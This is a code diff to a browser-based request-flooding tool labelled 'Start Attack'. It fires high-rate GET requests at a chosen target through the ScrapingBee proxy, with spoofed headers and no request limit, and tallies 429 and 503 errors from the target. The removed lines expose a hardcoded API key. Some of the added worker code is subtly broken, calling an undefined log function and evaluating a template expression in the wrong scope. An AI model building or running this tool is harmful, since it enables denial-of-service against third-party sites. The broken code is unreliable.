@@ -79,6 +79,10 @@
             <label for="targetUrl" class="block text-sm font-medium mb-2">Target URL:</label>
             <input type="text" id="targetUrl" class="focus:ring-indigo-500 focus:border-indigo-500" placeholder="e.g., https://api.example.com/data">
         </div>
+        <div class="mb-4">
+            <label for="scrapingBeeApiKey" class="block text-sm font-medium mb-2">ScrapingBee API Key:</label>
+            <input type="text" id="scrapingBeeApiKey" class="focus:ring-indigo-500 focus:border-indigo-500" placeholder="Your ScrapingBee API Key">
+        </div>
         <div class="mb-6 flex space-x-4">
             <div class="flex-1">
                 <label for="requestsPerSecond" class="block text-sm font-medium mb-2">Requests per Second (Target):</label>
@@ -88,6 +92,10 @@
                 <label for="maxRequests" class="block text-sm font-medium mb-2">Max Requests (0 for unlimited):</label>
                 <input type="number" id="maxRequests" class="focus:ring-indigo-500 focus:border-indigo-500" value="0" min="0">
             </div>
+        </div>
+        <div class="mb-6">
+            <label for="customHeaders" class="block text-sm font-medium mb-2">Custom Headers (JSON format):</label>
+            <textarea id="customHeaders" class="focus:ring-indigo-500 focus:border-indigo-500" rows="4" placeholder='e.g., {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}'></textarea>
         </div>
         <div class="flex justify-center space-x-4 mb-6">
             <button id="startButton" class="w-full sm:w-auto">Start Attack</button>
@@ -114,8 +122,10 @@
     </div>
     <script>
         const targetUrlInput = document.getElementById('targetUrl');
+        const scrapingBeeApiKeyInput = document.getElementById('scrapingBeeApiKey');
         const requestsPerSecondInput = document.getElementById('requestsPerSecond');
         const maxRequestsInput = document.getElementById('maxRequests');
+        const customHeadersInput = document.getElementById('customHeaders');
         const startButton = document.getElementById('startButton');
         const stopButton = document.getElementById('stopButton');
         const clearLogButton = document.getElementById('clearLogButton');
@@ -135,6 +145,7 @@
         let error503Count = 0;
         let startTime = 0;
         let worker;
+        let customHeaders = {};
 
         // Function to append messages to the log area
         function log(message, type = 'info') {
@@ -154,6 +165,19 @@
             const rps = parseInt(requestsPerSecondInput.value, 10);
             if (isNaN(rps) || rps <= 0) {
                 log('Error: Requests per second must be a positive number.', 'fail');
+                return;
+            }
+
+            const apiKey = scrapingBeeApiKeyInput.value;
+            if (!apiKey) {
+                log('Error: Please provide a ScrapingBee API Key.', 'fail');
+                return;
+            }
+
+            try {
+                customHeaders = JSON.parse(customHeadersInput.value);
+            } catch (e) {
+                log('Error: Custom headers must be valid JSON.', 'fail');
                 return;
             }
 
@@ -179,9 +203,9 @@
             startTime = performance.now();
 
             const delay = 1000 / rps;
-            const blob = new Blob([
-                `self.onmessage = (event) => {
-                    const { delay, maxRequests, targetUrl, apiKey } = event.data;
+            const workerCode = `
+                self.onmessage = (event) => {
+                    const { delay, maxRequests, targetUrl, apiKey, customHeaders } = event.data;
                     let requestCount = 0;
                     let successfulCount = 0;
                     let failedCount = 0;
@@ -215,49 +239,77 @@
                         requestCount++;
                         const url = \`https://app.scrapingbee.com/api/v1/?api_key=${apiKey}&url=${encodeURIComponent(targetUrl)}&render_js=true\`;
 
-                        fetch(url, {
-                            method: 'GET',
-                            cache: 'no-store',
-                            mode: 'no-cors'
-                        })
-                        .then(response => {
-                            if (response.status === 429) {
-                                error429Count++;
-                                failedCount++;
-                            } else if (response.status === 503) {
-                                error503Count++;
-                                failedCount++;
-                            } else if (response.ok || response.status === 0) {
-                                successfulCount++;
-                            } else {
-                                failedCount++;
-                            }
-                            self.postMessage({
-                                requestCount,
-                                successfulCount,
-                                failedCount,
-                                error429Count,
-                                error503Count
-                            });
-                        })
-                        .catch(error => {
-                            failedCount++;
-                            self.postMessage({
-                                requestCount,
-                                successfulCount,
-                                failedCount,
-                                error429Count,
-                                error503Count
-                            });
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', url, true);
+                        xhr.timeout = 5000; // 5 seconds timeout
+                        xhr.withCredentials = true;
+
+                        Object.keys(customHeaders).forEach(header => {
+                            xhr.setRequestHeader(header, customHeaders[header]);
                         });
+
+                        xhr.onreadystatechange = function () {
+                            if (xhr.readyState === 4) {
+                                if (xhr.status === 429) {
+                                    error429Count++;
+                                    failedCount++;
+                                    log(\`429 Too Many Requests\`, '429');
+                                } else if (xhr.status === 503) {
+                                    error503Count++;
+                                    failedCount++;
+                                    log(\`503 Service Unavailable\`, '503');
+                                } else if (xhr.status >= 200 && xhr.status < 300) {
+                                    successfulCount++;
+                                    log(\`Success\`, 'success');
+                                } else {
+                                    failedCount++;
+                                    log(\`Failed with status ${xhr.status}\`, 'fail');
+                                }
+                                self.postMessage({
+                                    requestCount,
+                                    successfulCount,
+                                    failedCount,
+                                    error429Count,
+                                    error503Count
+                                });
+                            }
+                        };
+
+                        xhr.onerror = function () {
+                            failedCount++;
+                            log(\`Network error\`, 'fail');
+                            self.postMessage({
+                                requestCount,
+                                successfulCount,
+                                failedCount,
+                                error429Count,
+                                error503Count
+                            });
+                        };
+
+                        xhr.ontimeout = function () {
+                            failedCount++;
+                            log(\`Timeout\`, 'fail');
+                            self.postMessage({
+                                requestCount,
+                                successfulCount,
+                                failedCount,
+                                error429Count,
+                                error503Count
+                            });
+                        };
+
+                        xhr.send();
                     }
 
                     // Use setInterval for high-frequency requests
                     setInterval(sendRequest, delay);
-                }`
-            ], { type: 'application/javascript' });
-            worker = new Worker(URL.createObjectURL(blob));
-            worker.postMessage({ delay, maxRequests: parseInt(maxRequestsInput.value, 10), targetUrl: targetUrlInput.value, apiKey: 'SKI50V1VXTECATB7VR23DYKQM4BNC81U3IMKB4Z15G6WIHT88SZGBYT37X8EX2UENVZXKXGGF3QWK13R' });
+                };
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(blob);
+            worker = new Worker(workerUrl);
+            worker.postMessage({ delay, maxRequests: parseInt(maxRequestsInput.value, 10), targetUrl: targetUrlInput.value, apiKey, customHeaders });
 
             worker.onmessage = (event) => {
                 const data = event.data;
